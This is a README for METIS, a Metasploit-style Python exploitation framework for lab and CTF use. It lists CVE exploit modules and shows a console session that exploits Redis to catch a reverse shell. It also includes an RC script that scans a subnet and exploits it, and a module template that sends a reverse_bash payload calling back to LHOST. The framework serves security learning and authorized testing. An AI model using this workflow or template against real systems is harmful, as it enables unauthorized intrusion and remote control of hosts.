# METIS - **Modular Exploitation & Threat Intelligence Framework**
```text
███╗   ███╗███████╗████████╗██╗███████╗
████╗ ████║██╔════╝╚══██╔══╝██║██╔════╝
██╔████╔██║█████╗     ██║   ██║███████╗
██║╚██╔╝██║██╔══╝     ██║   ██║╚════██║
██║ ╚═╝ ██║███████╗   ██║   ██║███████║
╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝╚══════╝
```

A Python exploitation framework built for learning. Modular architecture, themed console, multiple session transports, and a growing library of CVE modules.

---

## Community Driven

METIS is a **community-driven security research framework**. The goal is to build a growing collection of modules contributed by security researchers, developers, and the wider community.

Have a useful scanner, auxiliary module, exploit module, or other security research tooling you'd like to share? **Add it to METIS and open a Pull Request.**

All contributions are welcome, provided they follow the project's module structure, coding standards, and authorized-use guidelines.

Whether you're adding a new CVE module, improving an existing module, fixing a bug, or building new framework functionality, your contributions can help make METIS better for everyone.

See **[Writing modules](#writing-modules)** below for information on creating your own module.

---

## What it is

METIS is a modular C2/exploitation framework written in Python. It runs a Metasploit-style interactive console where you select modules, set options, run checks, and land sessions against lab targets.

It's designed for:

* **Learning** how exploitation frameworks work under the hood
* **Lab work** against vulnerable VMs and containers
* **CTF practice** where a scriptable framework is faster than manual tooling
* **Community contributions** through custom modules and framework improvements

It is **not** designed for:

* Attacking systems you don't own or have written permission to test
* Production red-team engagements (use Cobalt Strike, Sliver, or Mythic)
* Anything on the public internet

---

## Features

* **Modular architecture** — drop a `.py` file into `modules/` and it auto-registers
* **Two module types** — `Exploit` (spawns sessions) and `Auxiliary` (scanners, enumerators)
* **Tri-state `check()`** — every module can verify before attacking (`VULNERABLE` / `SAFE` / `UNKNOWN`)
* **Multiple session transports** — reverse sockets, bind sockets, paramiko channels, HTTP webshells, raw telnet
* **Threaded scanning** — CIDR/comma-list/range/`file:` target specs with live progress bars
* **Themed console** — 22 built-in color schemes with per-theme progress bar gradients
* **RC file automation** — script entire workflows
* **Per-module SOURCE files** — load options from `KEY=VALUE` files
* **Local shell escape** — run any shell command without leaving the framework
* **Lean core** — deliberately minimal dependencies and abstractions

---

## Modules

### Auxiliary — scanners and enumerators

| Module                                                   | Description                                        |
| -------------------------------------------------------- | -------------------------------------------------- |
| `auxiliary/scanner/tcp_connect`                          | Threaded TCP port scanner                          |
| `auxiliary/scanner/hikvision_cve_2017_7921`              | Hikvision IP camera auth bypass + user enumeration |
| `auxiliary/scanner/mikrotik_winbox_creds_cve_2018_14847` | MikroTik WinBox credential leak                    |
| `auxiliary/scanner/redis_cve_2022_0543`                  | Redis Lua sandbox escape detector                  |

### Exploits — session-producing

| Module                                                         | Session type           |
| -------------------------------------------------------------- | ---------------------- |
| `exploit/unix/ftp/vsftpd_234_backdoor`                         | Bind socket            |
| `exploit/multi/http/ghost_cms_handlebars_rce`                  | Reverse socket         |
| `exploit/multi/http/langflow_rce_cve_2026_9198`                | Reverse socket         |
| `exploit/multi/http/budibase_plugin_upload_rce_cve_2026_31816` | Reverse socket         |
| `exploit/multi/http/activemq_jolokia_rce_cve_2026_34197`       | Reverse socket         |
| `exploit/multi/http/tomcat_put_rce_cve_2017_12615`             | Reverse socket         |
| `exploit/multi/http/joomla_jce_rce_cve_2026_48907`             | HTTP webshell          |
| `exploit/linux/http/freepbx_sqli_rce_cve_2025_57819`           | Delayed reverse (cron) |
| `exploit/linux/redis/redis_cve_2022_0543_rce`                  | Reverse socket         |
| `exploit/linux/ssh/libssh_auth_bypass_cve_2018_10933`          | Paramiko channel       |
| `exploit/linux/telnet/inetutils_telnetd_bypass_cve_2026_24061` | Raw telnet socket      |

---

## Install

Requires **Python 3.10+** and **git**.

```bash
git clone https://github.com/K3ysTr0K3R/METIS.git
cd METIS

python3 -m venv .venv
source .venv/bin/activate

pip install -r requirements.txt
```

`requirements.txt`:

```text
pwntools>=4.11.0
requests>=2.31.0
paramiko>=3.0.0
redis>=5.0.0
cryptography>=42.0.0
rich>=13.7.0
prompt_toolkit>=3.0.43
```

Run:

```bash
python3 metis.py
```

---

## Usage

```text
metis > show modules

  #    Module                                                        Date        Rank       Chk  Description
  --   ------------------------------------------------------------  ----------  ---------  ---  -----------
  1    auxiliary/scanner/hikvision_cve_2017_7921                     2017-09-23  normal     Yes  Hikvision IP Camera Authentication Bypass (CVE-2017-7921)
  2    auxiliary/scanner/mikrotik_winbox_creds_cve_2018_14847        2018-08-01  great      Yes  MikroTik WinBox Credential Leak (CVE-2018-14847)
  ...
  15   exploit/unix/ftp/vsftpd_234_backdoor                          2011-07-03  excellent  Yes  vsftpd 2.3.4 Backdoor Command Execution

metis > search redis

  #   Module                                       Date        Rank       Chk  Description
  --  ------                                       ----       ----       ---  -----------
  1   auxiliary/scanner/redis_cve_2022_0543        2022-02-18  excellent  Yes  Redis CVE-2022-0543 Scanner
  2   exploit/linux/redis/redis_cve_2022_0543_rce  2022-02-18  excellent  Yes  Redis CVE-2022-0543 Lua Sandbox Escape RCE

metis > use 2
[*] using exploit/linux/redis/redis_cve_2022_0543_rce
metis exploit(linux/redis/redis_cve_2022_0543_rce) > set RHOST 192.168.56.101
[+] RHOST => 192.168.56.101
metis exploit(linux/redis/redis_cve_2022_0543_rce) > set LHOST 192.168.56.1
[+] LHOST => 192.168.56.1
metis exploit(linux/redis/redis_cve_2022_0543_rce) > check
[*] check: probing 192.168.56.101:6379
[VULNERABLE] check: 192.168.56.101 vulnerable to CVE-2022-0543
[*] check -> vulnerable
metis exploit(linux/redis/redis_cve_2022_0543_rce) > exploit
[*] running check() before exploit (AUTOCHECK=true)
[VULNERABLE] check: 192.168.56.101 vulnerable to CVE-2022-0543
[+] target appears vulnerable — proceeding
[*] listening on 192.168.56.1:4444 for reverse shell
[+] shell from 192.168.56.101:51234
[+] new session: <Session a3f2b1c4 192.168.56.101:51234>

metis exploit(linux/redis/redis_cve_2022_0543_rce) > sessions
  a3f2b1c4  192.168.56.101:51234  (alive)

metis exploit(linux/redis/redis_cve_2022_0543_rce) > interact a3f2b1c4
[*] interacting with a3f2b1c4. 'background' returns, '!cmd' runs locally.
a3f2b1c4 $ id
uid=105(redis) gid=108(redis) groups=108(redis)
a3f2b1c4 $ background
metis >
```

---

## Common commands

| Command                 | Effect                                       |
| ----------------------- | -------------------------------------------- |
| `show modules`          | List every module with metadata              |
| `search <term>`         | Search by path, name, description, or CVE    |
| `use <N\|path>`         | Select a module by number or path            |
| `set <OPT> <val>`       | Set a module option                          |
| `setg <OPT> <val>`      | Set a global option (applies to all modules) |
| `check`                 | Run the module's non-destructive `check()`   |
| `run` / `exploit`       | Execute the module                           |
| `sessions`              | List active sessions                         |
| `interact <sid>`        | Drop into a session                          |
| `connect <host> <port>` | Connect to a bind shell                      |
| `listen <host> <port>`  | Start a raw TCP handler                      |
| `resource <file.rc>`    | Execute commands from an RC file             |
| `theme <name>`          | Switch theme (22 available)                  |
| `gradient`              | Configure progress bar gradient              |
| `!<cmd>`                | Run a local shell command                    |
| `shell`                 | Drop into an interactive local shell         |
| `exit`                  | Quit                                         |

---

## Targets — RHOST vs RHOSTS

For auxiliary scanners, use `RHOSTS`. It accepts:

```text
set RHOSTS 192.168.56.101
set RHOSTS 192.168.56.101,192.168.56.102,10.0.0.5
set RHOSTS 192.168.56.0/24
set RHOSTS 192.168.56.100-192.168.56.120
set RHOSTS file:/path/to/targets.txt
```

Files can contain any of the above, one per line, with `#` comments.

For exploits, `RHOST` takes a single target.

---

## Themes

22 built-in color schemes. `theme` with no argument lists them all with previews.

```text
theme synthwave       theme cyberpunk       theme tokyo
theme dracula         theme nord            theme gruvbox
theme catppuccin      theme rose-pine       theme kanagawa
theme everforest      theme solarized       theme one
theme ocean           theme arctic          theme blood
theme blade           theme matrix          theme mono
theme miami           theme synthwave-crt   theme ansi16
```

Default at boot is `synthwave`. Override with:

```bash
METIS_THEME=ocean python3 metis.py
```

---

## RC files

Automate workflows:

```text
# scan.rc
use auxiliary/scanner/redis_cve_2022_0543
set RHOSTS 192.168.56.0/24
set THREADS 100
set TIMEOUT 2
run
back
use exploit/linux/redis/redis_cve_2022_0543_rce
set RHOST 192.168.56.101
set LHOST 192.168.56.1
exploit
sessions
```

Then:

```text
metis > resource scan.rc
```

---

## Writing modules

A module is a single `.py` file that inherits from `Exploit` or `Auxiliary`.

```python
from core import colors
from core.check import CheckResult
from core.exploit import Exploit, catch_reverse_shell
from core.module import Option
from core.payloads import reverse_bash


class MyExploit(Exploit):
    NAME = "Vendor Product RCE (CVE-XXXX-XXXXX)"
    DESCRIPTION = "What this module does, in one or two sentences."
    AUTHOR = "your_handle"
    RANK = "excellent"
    DISCLOSED = "2025-08-15"
    CHECK = True
    REFERENCES = ["CVE-XXXX-XXXXX", "https://example.com/advisory"]

    OPTIONS = [
        Option("RHOST", required=True, description="target host"),
        Option("RPORT", default=8080, type=int, description="HTTP port"),
        Option("LHOST", required=True, description="reverse shell callback IP"),
        Option("LPORT", default=4444, type=int, description="callback port"),
    ]

    def check(self):
        try:
            r = requests.get(
                f"http://{self.options['RHOST']}/version",
                timeout=5
            )
        except requests.RequestException:
            return CheckResult.SAFE

        if "vulnerable-marker" in r.text:
            return CheckResult.VULNERABLE

        return CheckResult.SAFE

    def exploit(self):
        payload = reverse_bash(
            self.options["LHOST"],
            self.options["LPORT"]
        )

        def trigger():
            requests.post(
                f"http://{self.options['RHOST']}/exec",
                data={"cmd": payload}
            )

        ok = catch_reverse_shell(
            self,
            self.options["LHOST"],
            self.options["LPORT"],
            timeout=45,
            trigger=trigger,
        )

        return True if ok else None
```

Drop it in `modules/exploits/multi/http/`, restart METIS, and it appears in `show modules`.

See `core/module.py` for the full option contract and `core/exploit.py` for the session-bridging helpers.

### Contributing a module

Have your own security research module?

1. Fork the METIS repository.
2. Create your module following the existing module structure.
3. Test it against an authorized lab target.
4. Add the appropriate metadata and references.
5. Commit your changes.
6. Open a **Pull Request**.

When submitting a module, include enough information for other contributors to understand what the module does, what vulnerability or research it is based on, and how it should be tested safely.

Community contributions are what allow the METIS module library to grow.

---

## Legal

This tool is provided for **authorized security testing and education only**.

Use it against:

* Your own lab machines and virtual networks
* Vulnerable VMs you download for practice (Metasploitable, VulnHub, HTB, TryHackMe)
* Systems you have **explicit written permission** to test
* Bug bounty targets within the published scope

Using METIS against systems you don't own or have permission to test is **illegal in most jurisdictions and can result in criminal charges**. The author assumes no responsibility for misuse.

The CVE modules in this repository are ports of publicly available proof-of-concept code. They exist to demonstrate the module architecture — not to enable mass exploitation.

---

## Credits

* Icons, colors, and layout inspired by Metasploit Framework

---

## License

MIT — see `LICENSE`.
